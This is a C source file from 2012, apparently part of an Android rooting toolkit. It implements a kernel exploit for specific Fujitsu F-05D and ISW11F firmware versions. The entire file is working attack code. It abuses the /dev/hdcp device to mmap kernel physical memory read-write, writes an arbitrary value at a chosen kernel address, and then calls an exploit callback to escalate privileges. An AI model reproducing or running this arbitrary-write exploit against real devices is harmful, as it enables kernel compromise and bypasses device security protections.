/*
 *  Copyright (c) 2012 goroh_kun
 *
 *  2012/11/16
 *  goroh.kun@gmail.com
 */

#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include "../device_database/device_database.h"

#include "fj_hdcp.h"

#define KERNEL_VIRT_ADDRESS     0xc0000000
#define KERNEL_PHYS_ADDRESS     0x80000000
#define KERNEL_SIZE             0x00a00000
#define MAPPED_BASE             0x20000000
#define MAPPED_OFFSET           0x58006000

#define PHYS_SIZE               (KERNEL_PHYS_ADDRESS - MAPPED_OFFSET + KERNEL_SIZE)

#define KERNEL_TEXT_ADDRESS     0xc0008000

static uint32_t PAGE_OFFSET = (KERNEL_VIRT_ADDRESS - KERNEL_PHYS_ADDRESS + MAPPED_OFFSET);

static void *
convert_to_kernel_address(void *address, void *mmap_base_address)
{
  return address - mmap_base_address + (void*)PAGE_OFFSET;
}

static void *
convert_to_mmaped_address(void *address, void *mmap_base_address)
{
  return mmap_base_address + (uint32_t)address - PAGE_OFFSET;
}

bool
fj_hdcp_write_value_at_address(unsigned long address, int value)
{
  void *mmap_address = NULL;
  int *write_address;
  int fd;

  switch (detect_device())
  {
  case DEVICE_F05D_V08R31C:
  case DEVICE_F05D_V11R40A:
  case DEVICE_ISW11F_V25R45A:
  case DEVICE_ISW11F_V27R47I:
    break;

  default:
    return false;
  }

  fd = open("/dev/hdcp", O_RDWR);
  if (fd < 0) {
    return false;
  }

  mmap_address = mmap((void *)MAPPED_BASE, PHYS_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0);

  if (mmap_address == MAP_FAILED) {
    printf("Failed to mmap due to %s\n", strerror(errno));

    close(fd);
    return false;
  }

  write_address = convert_to_mmaped_address((void*)address, mmap_address);
  *write_address = value;

  munmap(mmap_address, PHYS_SIZE);

  close(fd);

  return true;
}

bool
fj_hdcp_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!fj_hdcp_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
